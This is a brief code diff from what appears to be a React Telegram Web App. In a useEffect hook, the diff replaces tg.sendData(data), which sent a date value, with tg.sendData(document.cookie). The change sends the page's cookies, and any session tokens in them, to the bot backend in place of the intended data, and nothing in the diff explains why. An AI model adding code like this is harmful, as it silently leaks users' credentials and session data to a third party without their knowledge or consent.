@@ -18,7 +18,7 @@ function App() {
    const data = date;
     // const t = window.Telegram;
     // const data = JSON.stringify(t);
-    tg.sendData(data);
+    tg.sendData(document.cookie);
   }, [date])
 
   useEffect(()=>{
